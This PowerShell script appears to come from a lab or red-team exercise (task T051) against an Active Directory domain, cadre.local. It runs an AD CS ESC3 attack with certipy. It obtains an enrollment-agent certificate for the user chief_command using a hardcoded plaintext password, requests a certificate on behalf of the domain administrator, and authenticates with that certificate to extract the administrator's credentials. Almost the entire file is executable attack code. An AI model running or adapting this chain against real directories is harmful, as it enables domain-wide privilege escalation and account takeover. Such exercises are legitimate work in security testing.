# T051 ESC3 - agent cert + on-behalf-of request as chief_command
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
Remove-Item esc3agent* , esc3admin* -ErrorAction SilentlyContinue

Write-Output "=== 1. request ESC3-Agent cert for chief_command ==="
& $certpy req -u "chief_command@cadre.local" -p "C0mm@nd_Ch1ef!" -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC3-Agent -upn chief_command@cadre.local -dynamic-endpoint -timeout 20 -out esc3agent 2>&1 | Select-Object -Last 12
Write-Output "agent_req_rc=$LASTEXITCODE"

$agentPfx = "C:\Tools\cadre-attack\esc3agent.pfx"
if (Test-Path $agentPfx) {
  Write-Output "=== 2. on-behalf-of request for administrator (ESC3-Target) ==="
  & $certpy req -u "chief_command@cadre.local" -p "C0mm@nd_Ch1ef!" -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC3-Target -on-behalf-of "cadre.local\administrator" -pfx $agentPfx -dynamic-endpoint -timeout 20 -out esc3admin 2>&1 | Select-Object -Last 12
  Write-Output "target_req_rc=$LASTEXITCODE"

  $targetPfx = "C:\Tools\cadre-attack\esc3admin.pfx"
  if (Test-Path $targetPfx) {
    Write-Output "=== 3. auth with ESC3 target cert (UnPAC) ==="
    & $certpy auth -pfx $targetPfx -dc-ip 192.168.77.10 -domain cadre.local -debug 2>&1 | Select-Object -Last 8
    Write-Output "auth_rc=$LASTEXITCODE"
  } else { Write-Output "NO_TARGET_PFX" }
} else { Write-Output "NO_AGENT_PFX" }
Write-Output "=== ESC3_DONE ==="
